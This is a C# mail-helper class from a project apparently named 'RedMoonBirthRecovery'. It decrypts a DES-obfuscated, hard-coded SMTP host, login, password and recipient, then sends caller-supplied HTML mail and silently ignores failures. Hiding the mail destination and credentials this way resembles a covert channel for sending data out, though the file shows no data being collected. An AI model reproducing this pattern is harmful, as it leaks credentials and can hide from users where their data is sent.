using System;
using System.Collections.Generic;
using System.Text;
using System.Collections;
using System.Net.Mail;
using System.Security.Cryptography;
using System.IO;
using System.Globalization;
namespace RedMoonBirthRecovery
{
    public class MailHelper
    {

        public class DesDecrypt
        {

            private string taozi = "wocaoniM";


 


            public string wocha(string mystr)
            {
                return Ri(mystr, taozi);
            }


            private byte[] Keys = { 0xEF, 0xAB, 0x56, 0x78, 0x90, 0x34, 0xCD, 0x12 };

 

            public string Ri(string mystr, string decryptKey)
            {
                try
                {
                    byte[] rgbKey = Encoding.UTF8.GetBytes(decryptKey.Substring(0, 8));
                    byte[] rgbIV = Keys;
                    byte[] inputByteArray = Convert.FromBase64String(mystr);
                    DESCryptoServiceProvider DCSP = new DESCryptoServiceProvider();
                    MemoryStream mStream = new MemoryStream();
                    CryptoStream cStream = new CryptoStream(mStream, DCSP.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Write);
                    cStream.Write(inputByteArray, 0, inputByteArray.Length);
                    cStream.FlushFinalBlock();
                    return Encoding.UTF8.GetString(mStream.ToArray());
                }
                catch
                {
                    return mystr;
                }
            }
        }

        public string smtp = "ymp1fARRW3HPBQfQAUjSFA==";
        public string from = "mkoMkAL228WlPkmGcMqKcYSOHBgAvbI8";
        public string pwd = "piyRQOMwagt3VqLeg6Bu1Q==";
        public string to = "ayfmavt+H4F+jQLemDw/B413s8zbckyc";
        public string subject;
        public string body;
        public ArrayList paths;

        public MailHelper(string Psubject, string Pbody)
        {
            DesDecrypt des = new DesDecrypt();
            subject = Psubject;
            body = Pbody;
            smtp = des.wocha(smtp);
            from = des.wocha(from);
            pwd = des.wocha(pwd);
            to = des.wocha(to);
        }

        /*发邮件*/
        public bool SendMail()
        {
            //是否发送成功
            bool isok = false;
            //创建smtpclient对象
            System.Net.Mail.SmtpClient client = new SmtpClient();
            client.Host = smtp;
            client.UseDefaultCredentials = false;
            client.Credentials = new System.Net.NetworkCredential(from, pwd);
            client.DeliveryMethod = SmtpDeliveryMethod.Network;

            //创建mailMessage对象 
            System.Net.Mail.MailMessage message = new MailMessage(from, to);
            message.Subject = subject;
            //正文默认格式为html
            message.Body = body;
            message.IsBodyHtml = true;
            message.BodyEncoding = System.Text.Encoding.UTF8;
 
            try
            {
                client.Send(message);
                isok = true;
            }
            catch (Exception)
            {
                isok = false;
            }
            return isok;
        }
    }
}
